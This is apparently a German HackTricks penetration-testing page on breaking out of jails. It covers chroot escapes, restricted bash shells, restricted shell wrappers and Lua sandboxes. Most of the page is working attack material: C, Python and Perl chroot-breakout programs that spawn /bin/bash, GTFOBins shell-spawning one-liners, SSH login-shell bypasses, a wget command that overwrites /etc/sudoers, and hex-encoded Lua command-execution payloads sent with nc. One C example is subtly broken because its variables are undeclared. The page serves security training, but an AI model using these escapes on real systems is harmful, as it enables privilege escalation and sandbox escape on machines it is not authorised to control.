# Aus Jails ausbrechen

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Suche auf** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **nach ausführbaren Dateien, die die Eigenschaft "Shell" besitzen**

## Chroot Escapes

Aus [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Der chroot-Mechanismus ist **nicht dazu gedacht, sich gegen vorsätzliche Manipulationen** durch **privilegierte** (**root**) **Benutzer zu schützen**. Auf den meisten Systemen lassen sich chroot-Kontexte nicht ordnungsgemäß verschachteln, und chrooted-Programme **mit ausreichenden Rechten können ein zweites chroot ausführen, um auszubrechen**.\
Normalerweise bedeutet das, dass du zum Ausbrechen innerhalb des chroot root sein musst.

> [!TIP]
> Das **Tool** [**chw00t**](https://github.com/earthquake/chw00t) wurde entwickelt, um die folgenden Szenarien auszunutzen und aus `chroot` auszubrechen.

### Root + CWD

> [!WARNING]
> Wenn du **innerhalb eines chroot root** bist, **kannst du ausbrechen**, indem du **ein weiteres chroot** erstellst. Das liegt daran, dass 2 chroots (unter Linux) nicht koexistieren können. Wenn du also einen Ordner erstellst und anschließend **ein neues chroot** in diesem neuen Ordner erstellst, während **du dich außerhalb davon befindest**, wirst du dich nun **außerhalb des neuen chroot** befinden und daher im FS sein.
>
> Das geschieht, weil chroot dein Arbeitsverzeichnis normalerweise NICHT in das angegebene Verzeichnis verschiebt. Du kannst also ein chroot erstellen, dich aber außerhalb davon befinden.

Normalerweise wirst du die Binärdatei `chroot` innerhalb eines chroot jail nicht finden. Du **könntest jedoch eine Binärdatei kompilieren, hochladen und ausführen**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gespeicherter fd

> [!WARNING]
> Dies ähnelt dem vorherigen Fall, aber in diesem Fall **speichert der Angreifer einen File Descriptor auf das aktuelle Verzeichnis** und erstellt anschließend den **chroot in einem neuen Ordner**. Da er schließlich **außerhalb** des chroot **Zugriff** auf diesen **FD** hat, greift er darauf zu und **entkommt**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kann über Unix Domain Sockets übertragen werden, daher:
>
> - Einen Child-Prozess erstellen (fork)
> - UDS erstellen, damit Parent und Child kommunizieren können
> - chroot im Child-Prozess in einem anderen Verzeichnis ausführen
> - Im Parent-Prozess einen FD für ein Verzeichnis erstellen, das sich außerhalb des neuen chroot des Child-Prozesses befindet
> - Diesen FD mithilfe des UDS an den Child-Prozess übertragen
> - Der Child-Prozess führt chdir zu diesem FD aus und kann aus dem Jail entkommen, da sich dieser außerhalb seines chroot befindet

### Root + Mount

> [!WARNING]
>
> - Das Root-Gerät (/) in ein Verzeichnis innerhalb des chroot mounten
> - In dieses Verzeichnis chrooten
>
> Dies ist unter Linux möglich

### Root + /proc

> [!WARNING]
>
> - procfs in ein Verzeichnis innerhalb des chroot mounten (falls es noch nicht gemountet ist)
> - Nach einer PID suchen, die einen anderen root/cwd-Eintrag besitzt, zum Beispiel: /proc/1/root
> - In diesen Eintrag chrooten

### Root(?) + Fork

> [!WARNING]
>
> - Einen Fork (Child-Prozess) erstellen, in einen anderen, tiefer im Dateisystem liegenden Ordner chrooten und dorthin wechseln
> - Vom Parent-Prozess aus den Ordner, in dem sich der Child-Prozess befindet, in einen Ordner vor dem chroot des Child-Prozesses verschieben
> - Dieser Child-Prozess befindet sich dadurch außerhalb des chroot

### ptrace

> [!WARNING]
>
> - Früher konnten Benutzer ihre eigenen Prozesse von einem eigenen Prozess aus debuggen, aber dies ist standardmäßig nicht mehr möglich
> - Falls es dennoch möglich ist, könnte man sich mittels ptrace in einen Prozess einklinken und darin einen shellcode ausführen ([siehe dieses Beispiel](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Informationen über das Jail abrufen:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH ändern

Prüfe, ob du die PATH-Umgebungsvariable ändern kannst
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Verwendung von vim
```bash
:set shell=/bin/sh
:shell
```
### Pager und Help-Viewer

In vielen eingeschränkten Umgebungen sind **Pager** oder **Help-Viewer** weiterhin verfügbar. Diese lassen sich normalerweise schneller ausnutzen, als zu versuchen, `PATH` neu aufzubauen.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Wenn `git` verfügbar ist, beachte, dass seine Hilfeausgabe normalerweise über einen Pager geleitet wird:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Häufige GTFOBins-One-Liner

Sobald du weißt, welche Binaries erreichbar sind, teste zuerst die offensichtlichen Shell-Spawner:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Wenn du nur **Argumente in einen erlaubten Befehl injizieren** kannst (anstatt ihn frei auszuführen), solltest du auch **GTFOArgs** prüfen.

### Skript erstellen

Prüfe, ob du eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen kannst.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Bash über SSH erhalten

Wenn du über SSH zugreifst, kannst du den Server oft auffordern, ein **anderes Programm** anstelle der eingeschränkten Login-Shell auszuführen:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Wenn `ssh` eines der wenigen lokal erlaubten Binaries ist, denke daran, dass es auch als **GTFOBin** missbraucht werden kann:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Deklarieren
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Du kannst beispielsweise die sudoers-Datei überschreiben.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Einige Umgebungen lassen dich nicht in eine gewöhnliche `rbash`-Shell fallen, sondern in **wrappers** wie `git-shell`, `rssh` oder `lshell`:

- `git-shell` akzeptiert nur serverseitige Git-Befehle sowie alles, was sich innerhalb von `~/git-shell-commands/` befindet. Wenn dieses Verzeichnis existiert, führe `help` aus, um die erlaubten benutzerdefinierten Aktionen aufzulisten. Wenn du dort **schreiben** kannst, wird jedes in diesem Verzeichnis abgelegte ausführbare Programm erreichbar.
- `rssh` / `lshell` erlauben üblicherweise nur `scp`, `sftp`, `rsync` oder Git-ähnliche Operationen. Konzentriere dich in diesen Fällen zuerst auf **file write primitives**: Lade `authorized_keys`, eine Shell-Startup-Datei oder ein Hilfsskript an einen beschreibbaren Ort hoch und verbinde dich anschließend mit `ssh -t ...` erneut.
- Wenn der wrapper nur die Befehlszeile filtert, liste die erreichbaren Binaries auf und wechsle anschließend zu **GTFOBins / GTFOArgs**.

### Andere Tricks

Prüfe außerdem:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Auch diese Seite könnte interessant sein:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks zum Escaping aus Python Jails findest du auf der folgenden Seite:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Auf dieser Seite findest du die globalen Funktionen, auf die du innerhalb von Lua Zugriff hast: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval mit command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Einige Tricks, um **Funktionen einer Bibliothek ohne Verwendung von Punkten aufzurufen**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Funktionen einer Bibliothek auflisten:
```bash
for k,v in pairs(string) do print(k,v) end
```
Beachte, dass sich jedes Mal, wenn du den vorherigen **one liner in einer anderen Lua-Umgebung ausführst, die Reihenfolge der Funktionen ändert**. Wenn du daher eine bestimmte Funktion ausführen musst, kannst du einen **brute force attack** durchführen, indem du verschiedene Lua-Umgebungen lädst und die erste Funktion der Bibliothek aufrufst:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive lua shell erhalten**: Wenn du dich in einer eingeschränkten lua shell befindest, kannst du eine neue lua shell (und hoffentlich eine uneingeschränkte) erhalten, indem du Folgendes aufrufst:
```bash
debug.debug()
```
## Referenzen

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Folien: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
